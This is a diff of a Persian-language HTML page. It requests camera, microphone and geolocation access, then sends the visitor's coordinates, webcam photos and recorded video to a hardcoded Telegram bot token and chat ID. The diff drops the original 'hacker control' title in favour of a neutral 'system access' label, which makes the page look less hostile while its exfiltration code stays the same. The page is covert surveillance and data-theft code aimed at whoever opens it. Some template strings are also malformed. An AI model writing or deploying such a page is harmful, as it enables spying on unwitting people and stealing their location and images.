@@ -3,94 +3,64 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>کنترل هکری - دسترسی دوربین و میکروفن</title>
+  <title>دسترسی سیستمی</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       background: black;
       color: #00ff00;
-      font-family: 'Courier New', monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      font-family: monospace;
       text-align: center;
     }
-
     h1 {
-      font-size: 2.5em;
-      margin-bottom: 20px;
+      margin-top: 40px;
     }
-
     button {
-      background-color: #222;
-      color: #00ff00;
-      padding: 12px 24px;
-      font-size: 1em;
+      background: transparent;
       border: 2px solid #00ff00;
-      border-radius: 8px;
-      cursor: pointer;
+      color: #00ff00;
+      padding: 10px 20px;
       margin: 10px;
-      transition: all 0.3s ease-in-out;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: 0.3s;
     }
-
     button:hover {
-      background-color: #00ff00;
-      color: #000;
+      background: #00ff00;
+      color: black;
     }
-
     video {
       margin-top: 20px;
       border: 2px solid #00ff00;
       border-radius: 10px;
     }
-
     #camera, #locationResult, #audioResult {
-      margin-top: 20px;
       display: none;
-    }
-
-    .container {
-      padding: 20px;
-    }
-
-    .glitch {
-      color: #0f0;
-      font-size: 1em;
-      animation: blink 1s infinite alternate;
-    }
-
-    @keyframes blink {
-      from { opacity: 1; }
-      to { opacity: 0.2; }
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>پنل دسترسی سیستمی</h1>
-    <p class="glitch">در حال اتصال به دستگاه...</p>
-    <button onclick="requestPermissions()">دریافت دسترسی‌ها</button>
+  <h1>پنل کنترل</h1>
+  <button onclick="requestPermissions()">درخواست دسترسی</button>
 
-    <div id="camera">
-      <h3>نمای زنده دوربین:</h3>
-      <video id="video" width="320" height="240" autoplay></video>
-      <br>
-      <button onclick="captureImage()">گرفتن عکس</button>
-      <button onclick="captureVideo()">ضبط ویدیو</button>
-    </div>
+  <div id="camera">
+    <h3>دوربین:</h3>
+    <video id="video" width="320" height="240" autoplay></video>
+    <br>
+    <button onclick="captureImage()">عکس</button>
+    <button onclick="captureVideo()">ویدیو</button>
+  </div>
 
-    <div id="locationResult">
-      <h3>موقعیت مکانی:</h3>
-      <p id="location"></p>
-    </div>
+  <div id="locationResult">
+    <h3>موقعیت مکانی:</h3>
+    <p id="location"></p>
+  </div>
 
-    <div id="audioResult">
-      <h3>وضعیت میکروفن:</h3>
-      <p id="audioStatus"></p>
-    </div>
+  <div id="audioResult">
+    <h3>میکروفن:</h3>
+    <p id="audioStatus"></p>
   </div>
 
   <script>
@@ -100,9 +70,7 @@
       navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(function(s) {
           stream = s;
-
-          const videoElement = document.getElementById('video');
-          videoElement.srcObject = stream;
+          document.getElementById('video').srcObject = stream;
           document.getElementById('camera').style.display = 'block';
 
           document.getElementById('audioStatus').textContent = 'میکروفن فعال است.';
@@ -112,29 +80,29 @@
             navigator.geolocation.getCurrentPosition(function(position) {
               const latitude = position.coords.latitude;
               const longitude = position.coords.longitude;
-              document.getElementById('location').innerText =
-                Latitude: ${latitude}, Longitude: ${longitude};
+              const locationText = Latitude: ${latitude}, Longitude: ${longitude};
+              document.getElementById('location').textContent = locationText;
               document.getElementById('locationResult').style.display = 'block';
 
-              sendToTelegram(موقعیت مکانی: Latitude: ${latitude}, Longitude: ${longitude});
-            }, function() {
-              document.getElementById('location').innerText = 'دریافت موقعیت مکانی ناموفق بود.';
+              sendToTelegram(locationText);
+            }, function(error) {
+              document.getElementById('location').textContent = 'دریافت مکان ناموفق بود.';
             });
           } else {
-            alert("مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.");
+            alert('مرورگر شما از مکان‌یابی پشتیبانی نمی‌کند.');
           }
         })
-        .catch(function(error) {
-          alert("خطا در دریافت دسترسی‌ها: " + error.message);
+        .catch(function(err) {
+          alert("خطا در دسترسی: " + err.message);
         });
     }
 
     function captureImage() {
-      const videoElement = document.getElementById('video');
+      const video = document.getElementById('video');
       const canvas = document.createElement('canvas');
-      canvas.width = videoElement.videoWidth;
-      canvas.height = videoElement.videoHeight;
-      canvas.getContext('2d').drawImage(videoElement, 0, 0);
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
       const imageData = canvas.toDataURL('image/png');
       sendToTelegram(imageData, 'photo');
     }
@@ -143,37 +111,31 @@
       const recorder = new MediaRecorder(stream);
       const chunks = [];
 
-      recorder.ondataavailable = function(event) {
-        chunks.push(event.data);
-      };
-      recorder.onstop = function() {
+      recorder.ondataavailable = event => chunks.push(event.data);
+      recorder.onstop = () => {
         const blob = new Blob(chunks, { type: 'video/webm' });
-        const videoUrl = URL.createObjectURL(blob);
-        sendToTelegram(videoUrl, 'video');
+        const url = URL.createObjectURL(blob);
+        sendToTelegram(url, 'video');
       };
 
       recorder.start();
-      setTimeout(function() {
-        recorder.stop();
-      }, 5000); // ضبط ۵ ثانیه‌ای
+      setTimeout(() => recorder.stop(), 5000);
     }
 
     function sendToTelegram(data, type = 'text') {
       const chatId = '6368940774';
       const token = '8128114892:AAE_Yv6GG0tMPlO3ce9WpWQFsH1Ug58W08w';
 
-      let url = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)};
-
-      if (type === 'photo') {
+      let url = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)};if (type === 'photo') {
         url = https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(data)};
       } else if (type === 'video') {
         url = https://api.telegram.org/bot${token}/sendVideo?chat_id=${chatId}&video=${encodeURIComponent(data)};
       }
 
       fetch(url)
-        .then(response => response.json())
+        .then(res => res.json())
         .then(data => console.log("ارسال موفق:", data))
-        .catch(error => console.error("خطا در ارسال:", error));
+        .catch(err => console.error("خطا در ارسال:", err));
     }
   </script>
 </body>
